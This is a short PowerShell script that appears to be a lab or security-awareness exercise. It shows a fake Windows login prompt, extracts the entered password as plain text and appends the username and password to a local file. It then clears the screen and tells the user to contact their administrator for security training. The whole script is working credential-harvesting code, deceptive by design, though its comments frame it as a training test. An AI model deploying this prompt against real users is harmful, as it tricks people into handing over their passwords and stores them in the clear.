#This script requires unrestricted execution policy and UAC administrator privileges to run
#keep from closing


#credstorage path in lab environment
$FilePath = "E:\Powershell-projects\usercreds\creds.txt"

#check to make sure path exists
if (!(Test-Path $FilePath)) {
    New-Item -Path $FilePath -ItemType File -Force
}

# credprompt and write prompt for realism or make it look more obviously fake
$Creds = Get-Credential -Message "Uh-oh, This action requires secure login"

# extract to plaintext
$PlainTextPassword = $Creds.GetNetworkCredential().Password

#captured credentials
$CapturedCreds = "Username: $($Creds.UserName) | Password: $PlainTextPassword"

# Write to filepath
Add-Content -Path $FilePath -Value $CapturedCreds

#clear off process
Clear

#Gotcha message
Write-Host "Contact your administrator for mandatory security training"

Pause
